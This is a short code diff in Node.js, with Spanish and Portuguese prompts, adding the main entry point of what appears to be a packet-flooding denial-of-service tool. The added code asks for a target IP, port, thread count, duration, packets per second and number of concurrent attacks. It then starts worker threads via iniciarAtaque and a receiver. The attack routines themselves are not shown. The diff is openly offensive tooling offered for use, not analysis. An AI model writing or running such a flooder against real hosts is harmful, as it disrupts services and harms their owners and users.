@@ -131,3 +131,28 @@ const iniciarReceiver = (port = 0) => {
     client.bind(port);
 };
 
+// Ejecución principal
+if (isMainThread) {
+    const rl = readline.createInterface({
+        input: process.stdin,
+        output: process.stdout
+    });
+
+    rl.question(chalk.greenBright('[~] Ingresar IP: '), (address) => {
+        rl.question(chalk.greenBright('[~] Ingresar porta: '), (port) => {
+            rl.question(chalk.greenBright('[~] Ingresar threads: '), (threads) => {
+                rl.question(chalk.greenBright('[~] Ingresar tempo (em minutos): '), (time) => {
+                    rl.question(chalk.greenBright('[~] Ingresar PPS (Pacotes por segundo): '), (pps) => {
+                        rl.question(chalk.greenBright('[~] Ingresar ataques concurrentes: '), (concurrentes) => {
+                            iniciarAtaque(address, port, threads, time, pps, concurrentes);
+                            iniciarReceiver(port);
+                            rl.close();
+                        });
+                    });
+                });
+            });
+        });
+    });
+} else {
+    handleWorkerMessage(workerData);
+}
